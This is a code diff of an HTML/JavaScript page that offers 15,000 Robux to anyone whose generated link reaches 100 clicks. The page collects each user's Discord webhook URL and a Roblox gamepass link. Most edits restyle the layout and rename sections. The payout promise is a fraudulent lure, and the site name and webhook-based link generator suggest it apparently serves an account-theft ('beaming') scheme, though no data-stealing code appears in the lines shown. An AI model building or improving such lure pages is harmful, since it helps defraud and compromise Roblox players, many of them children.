@@ -64,30 +64,12 @@
         }
         
         .main-card {
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(8px);
-            border-radius: 1rem;
+            background: rgba(10, 10, 10, 0.9);
+            border-radius: 0.5rem;
             border: 1px solid var(--bright-red);
-            box-shadow: 0 8px 32px rgba(139, 0, 0, 0.3);
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
             overflow: hidden;
-        }
-        
-        .card-section {
             padding: 2rem;
-            background: var(--dark-red);
-            border-bottom: 1px solid var(--bright-red);
-        }
-        
-        .card-section:last-child {
-            border-bottom: none;
-        }
-        
-        .card-section.lighter {
-            background: var(--medium-red);
-        }
-        
-        .card-section.lightest {
-            background: var(--dark-red);
         }
         
         .page-title {
@@ -104,7 +86,7 @@
             font-family: 'Rajdhani', sans-serif;
             font-size: 1.2rem;
             color: var(--white);
-            margin-bottom: 1rem;
+            margin-bottom: 2rem;
             text-align: center;
         }
         
@@ -267,7 +249,7 @@
                 display: inline-block;
             }
             
-            .card-section {
+            .main-card {
                 padding: 1.5rem;
             }
         }
@@ -282,14 +264,11 @@
         </a>
         
         <div class="main-card">
-            <!-- Header Card Section -->
-            <div class="card-section">
-                <h1 class="page-title">MAKE MONEY</h1>
-                <p class="page-subtitle">Generate your own link, share it, and earn 15,000 Robux when you reach 100 clicks!</p>
-            </div>
+            <h1 class="page-title">MAKE MONEY</h1>
+            <p class="page-subtitle">Generate your own link, share it, and earn 15,000 Robux when you reach 100 clicks!</p>
             
-            <!-- Initial Form Card Section -->
-            <div class="card-section lighter" id="initial-card">
+            <!-- Initial Form Section -->
+            <div id="initial-section">
                 <div class="form-group">
                     <label for="webhook-url">Your Discord Webhook Url</label>
                     <input type="text" id="webhook-url" class="form-control" placeholder="https://discord.com/api/webhooks/...">
@@ -303,8 +282,8 @@
                 <div id="webhook-error" class="error-message hidden"></div>
             </div>
             
-            <!-- Generated Link Card Section -->
-            <div class="card-section lightest hidden" id="link-card">
+            <!-- Generated Link Section -->
+            <div id="link-section" class="hidden">
                 <h2 class="section-title">Your Link is Ready!</h2>
                 <div class="input-group" style="flex-direction: column;">
                     <div class="link-display" id="generated-link">https://pharaohbeam.xyz/loading...</div>
@@ -314,8 +293,8 @@
                 </div>
             </div>
             
-            <!-- Gamepass Submission Card Section -->
-            <div class="card-section lighter hidden" id="gamepass-card">
+            <!-- Gamepass Submission Section -->
+            <div id="gamepass-section" class="hidden">
                 <h2 class="section-title">SUBMIT YOUR GAMEPASS</h2>
                 <p style="text-align: center; margin-bottom: 1rem;">Create a Roblox gamepass for 6000-8000 Robux and submit the link below. We'll automatically purchase it when you reach 100 clicks!</p>
                 
@@ -329,21 +308,21 @@
                 
                 <div id="success-message" class="success-message hidden">Gamepass Submitted! We will buy your gamepass once you reach 100 clicks</div>
                 <div id="gamepass-error" class="error-message hidden"></div>
-                
-                <p class="footer-note">If you have any issues, contact <a href="https://discord.gg/phar" style="color: var(--bright-red);">https://discord.gg/phar</a> on Discord.</p>
             </div>
+            
+            <p class="footer-note">If you have any issues, contact <a href="https://discord.gg/phar" style="color: var(--bright-red);">https://discord.gg/phar</a> on Discord.</p>
         </div>
     </div>
 
     <script>
         // Configuration
-        const BASE_URL = 'https://pharaohbeam.xyz';
+        const BASE_URL = window.location.hostname === 'localhost' ? 'http://localhost:3000' : window.location.origin;
         const PHARAOH_PFP = 'https://media.discordapp.net/attachments/1360001414813843589/1377923321957580822/PHARAOH_BE4M_PFP.gif';
         
         // DOM Elements
-        const initialCard = document.getElementById('initial-card');
-        const linkCard = document.getElementById('link-card');
-        const gamepassCard = document.getElementById('gamepass-card');
+        const initialSection = document.getElementById('initial-section');
+        const linkSection = document.getElementById('link-section');
+        const gamepassSection = document.getElementById('gamepass-section');
         const generateBtn = document.getElementById('generate-btn');
         const webhookUrlInput = document.getElementById('webhook-url');
         const webhookError = document.getElementById('webhook-error');
@@ -465,9 +444,9 @@
             
             // Show success
             generatedLink.textContent = userLink;
-            initialCard.classList.add('hidden');
-            linkCard.classList.remove('hidden');
-            gamepassCard.classList.remove('hidden');
+            initialSection.classList.add('hidden');
+            linkSection.classList.remove('hidden');
+            gamepassSection.classList.remove('hidden');
             
             // Reset generate button
             generateBtn.disabled = false;
@@ -517,10 +496,7 @@
         });
 
         // Check if this is a generated link (for click tracking)
-        if (window.location.pathname.length > 1 && 
-            window.location.pathname !== '/clicks' && 
-            window.location.pathname !== '/clicks.html') {
-            
+        if (window.location.pathname.length > 1) {
             const linkId = window.location.pathname.substring(1);
             const userData = JSON.parse(localStorage.getItem(`link_${linkId}`));
             
